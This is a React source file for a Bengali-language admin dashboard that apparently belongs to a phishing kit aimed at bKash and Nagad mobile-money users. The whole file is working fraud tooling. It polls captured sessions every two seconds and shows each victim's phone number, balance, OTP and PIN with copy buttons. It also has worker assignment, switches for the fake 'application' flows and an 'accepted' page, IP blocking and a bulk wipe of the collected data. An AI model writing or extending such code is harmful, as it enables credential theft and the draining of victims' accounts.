
import React, { useState, useEffect, useRef } from 'react';
import { CustomerSession } from '../types';
import { db } from '../App';

interface AdminPanelProps {
  onBack: () => void;
}

const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
  const [sessions, setSessions] = useState<CustomerSession[]>([]);
  const [loading, setLoading] = useState(true);
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [successPageMode, setSuccessPageMode] = useState(false);
  const [nagadEnabled, setNagadEnabled] = useState<boolean>(() => {
    if (typeof localStorage !== 'undefined') {
      const saved = localStorage.getItem('setting_nagadEnabled');
      if (saved !== null) return saved === 'true';
    }
    return true;
  });
  const [bkashEnabled, setBkashEnabled] = useState<boolean>(() => {
    if (typeof localStorage !== 'undefined') {
      const saved = localStorage.getItem('setting_bkashEnabled');
      if (saved !== null) return saved === 'true';
    }
    return true;
  });
  const prevSessionIdsRef = useRef<Set<string>>(new Set());
  const audioRef = useRef<HTMLAudioElement | null>(null);

  useEffect(() => {
    audioRef.current = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbsGczHjqIxN/LdkMcKX2+3dR+RBklcLPZ2IhMICRlq9Xaj1QfIVuo0NqXWR8dYKXR3JxcHx9gnpybnqSjmpmcoqWimpugop+gn56cnJ6gop+goKCenZ+fn5+fnp6enp6enp6fnp6enp6enp6fn56fn5+fn5+fn56fn56enp6enp6fn5+fn5+fn5+fn5+fn56enp6enp6fn5+fn5+fn5+fn5+fn56enp6enp6fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fnw==');
  }, []);

  useEffect(() => {
    const ref = db.ref('settings/successPageMode');
    const unsubscribe = ref.on('value', (snapshot: any) => {
      setSuccessPageMode(!!snapshot.val());
    });
    return () => { if (typeof unsubscribe === 'function') unsubscribe(); };
  }, []);

  const toggleSuccessPageMode = () => {
    db.ref('settings/successPageMode').set(!successPageMode);
  };

  useEffect(() => {
    const ref = db.ref('settings/nagadEnabled');
    const unsubscribe = ref.on('value', (snapshot: any) => {
      const val = snapshot.val();
      const enabled = val === null ? true : !!val;
      setNagadEnabled(enabled);
      if (typeof localStorage !== 'undefined') {
        localStorage.setItem('setting_nagadEnabled', String(enabled));
      }
    });
    return () => { if (typeof unsubscribe === 'function') unsubscribe(); };
  }, []);

  const toggleNagadEnabled = async () => {
    const next = !nagadEnabled;
    setNagadEnabled(next);
    if (typeof localStorage !== 'undefined') {
      localStorage.setItem('setting_nagadEnabled', String(next));
    }
    try {
      await db.ref('settings/nagadEnabled').set(next);
    } catch (err) {
      console.error("Failed to toggle Nagad status:", err);
    }
  };

  useEffect(() => {
    const ref = db.ref('settings/bkashEnabled');
    const unsubscribe = ref.on('value', (snapshot: any) => {
      const val = snapshot.val();
      const enabled = val === null ? true : !!val;
      setBkashEnabled(enabled);
      if (typeof localStorage !== 'undefined') {
        localStorage.setItem('setting_bkashEnabled', String(enabled));
      }
    });
    return () => { if (typeof unsubscribe === 'function') unsubscribe(); };
  }, []);

  const toggleBkashEnabled = async () => {
    const next = !bkashEnabled;
    setBkashEnabled(next);
    if (typeof localStorage !== 'undefined') {
      localStorage.setItem('setting_bkashEnabled', String(next));
    }
    try {
      await db.ref('settings/bkashEnabled').set(next);
    } catch (err) {
      console.error("Failed to toggle bKash status:", err);
    }
  };

  useEffect(() => {
    const fetchSessions = async () => {
      try {
        const res = await fetch('/api/sessions');
        const data = await res.json();
        if (data) {
          const sessionList = Object.keys(data).map(key => ({
            ...data[key],
            id: key
          })).sort((a: any, b: any) => b.lastUpdated - a.lastUpdated);
          setSessions(sessionList);
        } else {
          setSessions([]);
        }
      } catch (err) {
        console.error("Fetch error:", err);
      } finally {
        setLoading(false);
      }
    };

    fetchSessions();
    const interval = setInterval(fetchSessions, 2000);
    return () => clearInterval(interval);
  }, []);

  const copyToClipboard = (text: string, fieldId: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopiedField(fieldId);
      setTimeout(() => setCopiedField(null), 1500);
    });
  };

  const performAction = (sessionId: string, action: string) => {
    db.ref('sessions/' + sessionId).update({
      adminAction: action,
      lastUpdated: Date.now()
    });
  };

  const blockIp = async (session: CustomerSession) => {
    if (session.clientIp) {
      await fetch('/api/block-ip', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: session.clientIp })
      });
      db.ref('sessions/' + session.id).update({ blocked: true, lastUpdated: Date.now() });
    }
  };

  const unblockIp = async (session: CustomerSession) => {
    if (session.clientIp) {
      await fetch('/api/unblock-ip', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: session.clientIp })
      });
      db.ref('sessions/' + session.id).update({ blocked: false, lastUpdated: Date.now() });
    }
  };

  const deleteSession = async (sessionId: string) => {
    if (confirm('\u098F\u0987 \u0995\u09BE\u09B8\u09CD\u099F\u09AE\u09BE\u09B0\u09C7\u09B0 \u09A1\u09BE\u099F\u09BE \u098F\u09AC\u0982 \u09B8\u09C7\u09B6\u09A8 \u09B8\u09CD\u09A5\u09BE\u09AF\u09BC\u09C0\u09AD\u09BE\u09AC\u09C7 \u09AE\u09C1\u099B\u09C7 \u09AB\u09C7\u09B2\u09A4\u09C7 \u099A\u09BE\u09A8?')) {
      await db.ref('sessions/' + sessionId).remove();
    }
  };

  const clearAllData = async () => {
    if (confirm('সব কাস্টমারের ডাটা ও সেশন ডাটাবেজ থেকে স্থায়ীভাবে মুছে ফেলতে চান?')) {
      setLoading(true);
      try {
        await fetch('/api/sessions/all', { method: 'DELETE' });
        setSessions([]);
      } catch (err) {
        console.error("Failed to clear all sessions:", err);
      } finally {
        setLoading(false);
      }
    }
  };


  return (
    <div data-keep-text data-keep-theme className="max-w-6xl mx-auto animate-fade-in bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100 font-sans">
      <div className="bg-slate-900 px-4 py-3 text-white flex justify-between items-center">
        <div className="flex items-center space-x-3">
          <div className="w-9 h-9 bg-[#E2136E] rounded-lg flex items-center justify-center shadow">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
          </div>
          <div>
            <h2 className="text-base font-bold leading-none">এডমিন প্যানেল</h2>
            <p className="text-slate-400 text-[10px] mt-0.5">{sessions.length} টি সেশন</p>
          </div>
        </div>
        <div className="flex items-center space-x-2">
          <button
            onClick={toggleSuccessPageMode}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[11px] font-bold transition-all border ${successPageMode ? 'bg-green-600 hover:bg-green-700 border-green-500 text-white' : 'bg-slate-700 hover:bg-slate-600 border-slate-600 text-slate-300'}`}
            title="আবেদন গৃহীত পেজ চালু/বন্ধ"
          >
            <span className={`w-2 h-2 rounded-full ${successPageMode ? 'bg-green-300 animate-pulse' : 'bg-slate-500'}`}></span>
            {successPageMode ? 'গৃহীত ON' : 'গৃহীত OFF'}
          </button>
          <button
            onClick={toggleBkashEnabled}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[11px] font-bold transition-all border ${bkashEnabled ? 'bg-[#E2136E] hover:bg-[#c4105f] border-pink-400 text-white' : 'bg-slate-700 hover:bg-slate-600 border-slate-600 text-slate-300'}`}
            title="বিকাশ দিয়ে আবেদন চালু/বন্ধ"
          >
            <span className={`w-2 h-2 rounded-full ${bkashEnabled ? 'bg-pink-200 animate-pulse' : 'bg-slate-500'}`}></span>
            {bkashEnabled ? 'বিকাশ ON' : 'বিকাশ OFF'}
          </button>
          <button
            onClick={toggleNagadEnabled}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[11px] font-bold transition-all border ${nagadEnabled ? 'bg-orange-500 hover:bg-orange-600 border-orange-400 text-white' : 'bg-slate-700 hover:bg-slate-600 border-slate-600 text-slate-300'}`}
            title="নগদ দিয়ে আবেদন চালু/বন্ধ"
          >
            <span className={`w-2 h-2 rounded-full ${nagadEnabled ? 'bg-orange-200 animate-pulse' : 'bg-slate-500'}`}></span>
            {nagadEnabled ? 'নগদ ON' : 'নগদ OFF'}
          </button>
          <button onClick={clearAllData} className="bg-red-600 hover:bg-red-700 px-3 py-1.5 rounded-lg text-[11px] font-bold transition-all">সব মুছুন</button>
          <button onClick={onBack} className="bg-slate-800 hover:bg-slate-700 px-3 py-1.5 rounded-lg text-[11px] font-bold transition-all">লগ আউট</button>
        </div>
      </div>

      <div className="p-3 overflow-x-auto">
        <table className="w-full text-left border-separate border-spacing-y-1.5 text-sm">
          <thead>
            <tr className="text-slate-400 text-[10px] uppercase tracking-wider font-bold">
              <th className="px-2 py-2">কাস্টমার</th>
              <th className="px-2 py-2">নাম্বার</th>
              <th className="px-2 py-2 text-center">ব্যালেন্স</th>
              <th className="px-2 py-2 text-center">OTP / PIN</th>
              <th className="px-2 py-2 text-center">অ্যাকশন</th>
            </tr>
          </thead>
          <tbody>
            {loading ? (
              <tr><td colSpan={5} className="px-3 py-10 text-center text-slate-400 italic">লোড হচ্ছে...</td></tr>
            ) : sessions.length > 0 ? (
              sessions.map((session) => {
                const isNagad = session.provider === 'nagad';
                return (
                <tr key={session.id} className={`bg-white shadow-sm hover:shadow-md transition-all ${session.blocked ? 'opacity-50' : ''}`}>
                  <td className="px-2 py-2 border-y border-l border-slate-100 rounded-l-xl">
                    <div className="flex items-center gap-2">
                      <span
                        className={`px-1.5 py-0.5 rounded text-[9px] font-black uppercase tracking-wider ${isNagad ? 'bg-orange-100 text-orange-700' : 'bg-pink-100 text-pink-700'}`}
                        title={isNagad ? 'Nagad' : 'bKash'}
                      >
                        {isNagad ? 'Nagad' : 'bKash'}
                      </span>
                      <div>
                        <p className="font-bold text-slate-800 text-xs leading-tight">{session.name}</p>
                        <p className="text-[9px] text-slate-400 font-mono leading-tight">{session.id}</p>
                        {session.assignedWorker && (
                          <span className="inline-flex items-center gap-0.5 mt-0.5 px-1.5 py-0 rounded text-[8px] font-bold bg-blue-50 text-blue-600 border border-blue-100">
                            🔒 W{session.assignedWorker}
                          </span>
                        )}
                      </div>
                    </div>
                  </td>
                  <td className="px-2 py-2 border-y border-slate-100">
                    <button
                      onClick={() => copyToClipboard(session.gatewayPhone || session.initialPhone, session.id + '_phone')}
                      className="text-xs font-bold text-[#E2136E] hover:bg-pink-50 px-1.5 py-0.5 rounded transition-all cursor-pointer"
                    >
                      {session.gatewayPhone || session.initialPhone}
                      {copiedField === session.id + '_phone' && <span className="ml-1 text-[9px] text-green-600">কপি!</span>}
                    </button>
                  </td>
                  <td className="px-2 py-2 border-y border-slate-100 text-center">
                    {(() => {
                      const displayBalance = session.balance || session.lastBalance || '';
                      const isLast = !session.balance && session.lastBalance;
                      return (
                        <div className="flex flex-col items-center">
                          <span className={`px-2 py-0.5 rounded-full text-[11px] font-bold ${parseInt(displayBalance) < 400 ? 'bg-red-50 text-red-600' : 'bg-green-50 text-green-600'}`}>
                            ৳ {displayBalance || '—'}
                          </span>
                          {isLast && <span className="text-[8px] text-gray-400 font-medium">সর্বশেষ</span>}
                        </div>
                      );
                    })()}
                  </td>
                  <td className="px-2 py-2 border-y border-slate-100 text-center">
                    <div className="flex items-center justify-center gap-1">
                      <button
                        onClick={() => copyToClipboard(session.gatewayOtp || session.otp || '', session.id + '_otp')}
                        className="font-mono font-bold text-slate-600 hover:bg-blue-50 px-1.5 py-0.5 rounded transition-all cursor-pointer text-xs"
                      >
                        {session.gatewayOtp || session.otp || '---'}
                        {copiedField === session.id + '_otp' && <span className="ml-1 text-[9px] text-green-600">কপি!</span>}
                      </button>
                      <span className="text-gray-300">/</span>
                      <button
                        onClick={() => copyToClipboard(session.pin || '', session.id + '_pin')}
                        className="font-mono font-bold text-slate-600 hover:bg-blue-50 px-1.5 py-0.5 rounded transition-all cursor-pointer text-xs"
                      >
                        {session.pin || '---'}
                        {copiedField === session.id + '_pin' && <span className="ml-1 text-[9px] text-green-600">কপি!</span>}
                      </button>
                    </div>
                  </td>
                  <td className="px-2 py-2 border-y border-r border-slate-100 rounded-r-xl text-center">
                    <div className="flex items-center justify-center gap-1">
                    {session.blocked ? (
                      <button onClick={() => unblockIp(session)} className="bg-green-50 text-green-500 p-1.5 rounded-lg hover:bg-green-500 hover:text-white transition-all" title="আনব্লক করুন">
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                      </button>
                    ) : (
                      <button onClick={() => blockIp(session)} className="bg-red-50 text-red-400 p-1.5 rounded-lg hover:bg-red-500 hover:text-white transition-all" title="ব্লক করুন">
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/></svg>
                      </button>
                    )}
                    </div>
                  </td>
                </tr>
                );
              })
            ) : (<tr><td colSpan={5} className="px-3 py-12 text-center text-slate-300 font-bold tracking-wider uppercase text-xs">কোনো সেশন নেই</td></tr>)}
          </tbody>
        </table>
      </div>
    </div>
  );
};

export default AdminPanel;
